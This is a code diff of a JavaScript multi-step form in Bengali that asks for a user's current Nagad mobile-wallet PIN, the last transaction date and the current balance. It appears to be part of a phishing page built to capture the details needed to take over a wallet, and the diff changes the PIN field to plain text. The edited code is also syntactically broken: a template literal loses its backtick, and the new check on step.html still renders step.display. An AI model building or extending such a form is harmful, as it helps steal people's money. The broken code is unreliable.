@@ -10,18 +10,15 @@ const steps = [
     title: "Password / PIN",
     description: "নগদ বর্তামান PIN লিখুন।",
     placeholder: "PIN",
-    type: "****"
+    type: "text"
   },
   {
     title: "Transaction & Balance",
-     html: `
+     html:
        <p>সর্বশেষ লেনদেনের তারিখ লিখুন</p>
         <input id="date" type="date">
-  },
-  {
-    title: "Current Balance",
-     html: 
-      <p>আপনার বর্তমান ব্যালেন্স লিখুন।<p>
+   
+      <p>আপনার বর্তমান ব্যালেন্স লিখুন।</p>
      <input id="balance" type="number" min="0" step="0.01"
         placeholder="00000">
   },
@@ -46,11 +43,13 @@ function showStep() {
   const step = steps[currentStep];
 
   title.textContent = step.title;
-  progress.textContent = `STEP ${currentStep + 1} / 5`;
-  progressBar.style.width = `${(currentStep + 1) * 20}%`;
+  progress.textContent = `STEP ${currentStep + 1} / ${steps.length}`;
+  progressBar.style.width =
+    `${((currentStep + 1) / steps.length) * 100}%`;
   message.textContent = "";
 
-  if (step.display) {
+
+  if (step.html) {
     content.innerHTML = `
       <p>${step.description}</p>
       <div class="demo-info">${step.display}</div>
